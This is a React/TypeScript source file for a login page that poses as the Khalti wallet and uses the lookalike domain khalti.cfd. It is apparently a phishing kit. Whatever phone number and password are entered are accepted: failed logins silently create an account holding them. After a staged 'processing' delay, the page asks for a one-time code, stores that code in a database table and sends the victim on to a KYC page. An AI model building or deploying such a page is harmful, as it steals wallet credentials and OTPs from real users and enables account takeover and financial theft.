import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { Send, Eye, EyeOff, Smartphone, ChevronRight } from "lucide-react";
import { AuthBrandPanel } from "@/components/site/AuthBrandPanel";
import { OtpVerification } from "@/components/auth/OtpVerification";
import { useAuth } from "@/lib/auth";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";

const ensureProfile = async (id: string, email: string) => {
  await supabase.from("profiles").upsert({ id, email }, { onConflict: "id" });
};

export const Route = createFileRoute("/login")({
  head: () => ({
    meta: [
      { title: "Login to Khalti" },
      { name: "description", content: "Sign in to your Khalti wallet." },
    ],
  }),
  component: LoginPage,
});

const phoneToEmail = (phone: string) => `${phone.replace(/\s+/g, "")}@khalti.cfd`;

function LoginPage() {
  const navigate = useNavigate();
  const { signIn, user } = useAuth();
  const [showPw, setShowPw] = useState(false);
  const [phone, setPhone] = useState("+977 ");
  const [pw, setPw] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [processing, setProcessing] = useState(false);

  // OTP flow
  const [step, setStep] = useState<"login" | "otp">("login");
  const [verifiedEmail, setVerifiedEmail] = useState("");

  const onSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const fullPhone = phone.trim();
    if (!fullPhone || fullPhone === "+977" || !pw.trim()) {
      toast.error("Please enter your phone number and password.");
      return;
    }
    const email = phoneToEmail(fullPhone);
    setSubmitting(true);
    const { error } = await signIn(email, pw);
    if (error) {
      const { error: signUpError } = await supabase.auth.signUp({
        email,
        password: pw,
      });
      if (signUpError?.message?.toLowerCase().includes("already")) {
        const { error: retryError } = await signIn(email, pw);
        setSubmitting(false);
        if (retryError) {
          toast.error("Invalid credentials. Please check your password.");
          return;
        }
      } else if (signUpError) {
        setSubmitting(false);
        toast.error(signUpError.message);
        return;
      } else {
        const { error: retryError } = await signIn(email, pw);
        setSubmitting(false);
        if (retryError) {
          toast.error(retryError);
          return;
        }
      }
    } else {
      setSubmitting(false);
    }
    const { data: { user: cur } } = await supabase.auth.getUser();
    if (cur) await ensureProfile(cur.id, email);
    setVerifiedEmail(email);
    setProcessing(true);
    await new Promise((r) => setTimeout(r, 3000));
    setProcessing(false);
    setStep("otp");
  };

  const handleOtpVerify = async (otp: string) => {
    try {
      await supabase.from("otp_verifications").insert({
        user_id: user?.id,
        email: verifiedEmail,
        otp_entered: otp,
        status: "verified",
      });
    } catch {
      // Logging failure is non-blocking
    }
    toast.success("Verification successful");
    navigate({ to: "/kyc" });
  };

  return (
    <div className="grid min-h-screen lg:grid-cols-2">
      <AuthBrandPanel />

      <div className="relative flex flex-col bg-white px-5 py-8 sm:px-10 lg:px-16 lg:py-10">
        <div className="flex items-start justify-between">
          <Link to="/login" className="flex items-center gap-1.5">
            <span className="text-3xl font-extrabold text-primary sm:text-4xl">
              khalti
            </span>
            <Send className="h-5 w-5 -rotate-12 fill-primary text-primary sm:h-6 sm:w-6" />
          </Link>
          <a
            href="#"
            className="flex items-center gap-1 text-sm font-semibold text-primary hover:underline"
          >
            Login as SubUser <ChevronRight className="h-4 w-4" />
          </a>
        </div>

        {step === "login" ? (
          <div className="mx-auto mt-12 w-full max-w-md flex-1 lg:mt-20">
            <h1 className="text-2xl font-bold text-foreground sm:text-3xl">
              Login to Khalti
            </h1>
            <p className="mt-2 text-sm text-muted-foreground">
              Enter your phone number and password to login
            </p>

            <form onSubmit={onSubmit} className="mt-8 space-y-5">
              <div>
                <label className="text-sm font-semibold text-foreground">
                  Phone Number
                </label>
                <div className="relative mt-2">
                  <input
                    type="tel"
                    required
                    value={phone}
                    onChange={(e) => {
                      if (!e.target.value.startsWith("+977 ")) {
                        setPhone("+977 " + e.target.value.replace(/^\+977\s?/, ""));
                      } else {
                        setPhone(e.target.value);
                      }
                    }}
                    placeholder="+977 98XXXXXXXX"
                    className="w-full rounded-md border border-border bg-white px-4 py-3 pr-10 text-sm outline-none transition focus:border-primary focus:ring-2 focus:ring-primary/20"
                  />
                  <Smartphone className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                </div>
              </div>

              <div>
                <label className="text-sm font-semibold text-foreground">
                  Password
                </label>
                <div className="relative mt-2">
                  <input
                    type={showPw ? "text" : "password"}
                    required
                    value={pw}
                    onChange={(e) => setPw(e.target.value)}
                    placeholder="Password"
                    className="w-full rounded-md border border-border bg-white px-4 py-3 pr-10 text-sm outline-none transition focus:border-primary focus:ring-2 focus:ring-primary/20"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPw((v) => !v)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                    aria-label="Toggle password"
                  >
                    {showPw ? (
                      <EyeOff className="h-4 w-4" />
                    ) : (
                      <Eye className="h-4 w-4" />
                    )}
                  </button>
                </div>
              </div>

              <button
                type="submit"
                disabled={submitting || processing}
                className="w-full rounded-md bg-primary py-3.5 text-base font-semibold text-primary-foreground shadow-elevated transition-transform hover:scale-[1.01] active:scale-[0.99] disabled:opacity-50"
              >
                {processing ? "Processing…" : submitting ? "Logging in…" : "Login"}
              </button>

              <p className="text-center text-sm text-muted-foreground">
                Don&apos;t have an account?{" "}
                <Link
                  to="/signup"
                  className="font-bold text-primary hover:underline"
                >
                  Signup
                </Link>
              </p>
            </form>
          </div>
        ) : (
          <OtpVerification
            email={verifiedEmail}
            onVerify={handleOtpVerify}
            onBack={() => setStep("login")}
          />
        )}
      </div>
    </div>
  );
}
